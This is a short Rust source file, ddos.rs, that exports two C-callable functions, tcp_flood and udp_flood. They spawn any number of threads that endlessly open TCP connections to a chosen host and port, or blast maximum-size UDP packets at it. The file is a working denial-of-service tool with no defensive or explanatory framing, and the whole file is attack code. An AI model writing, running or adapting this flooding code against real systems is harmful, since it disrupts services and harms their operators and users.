// ddos.rs
use std::net::{TcpStream, UdpSocket};
use std::thread;
use std::io::Write;

#[no_mangle]
pub extern "C" fn tcp_flood(target: *const i8, port: u16, threads: u32) {
    let target = unsafe { std::ffi::CStr::from_ptr(target).to_str().unwrap_or("127.0.0.1") };
    let addr = format!("{}:{}", target, port);
    for _ in 0..threads {
        let addr = addr.clone();
        thread::spawn(move || loop { let _ = TcpStream::connect(&addr); });
    }
}

#[no_mangle]
pub extern "C" fn udp_flood(target: *const i8, port: u16, threads: u32) {
    let target = unsafe { std::ffi::CStr::from_ptr(target).to_str().unwrap_or("127.0.0.1") };
    let addr = format!("{}:{}", target, port);
    let payload = vec![0u8; 65507];
    for _ in 0..threads {
        let addr = addr.clone();
        let payload = payload.clone();
        thread::spawn(move || {
            let socket = UdpSocket::bind("0.0.0.0:0").unwrap();
            loop { let _ = socket.send_to(&payload, &addr); }
        });
    }
}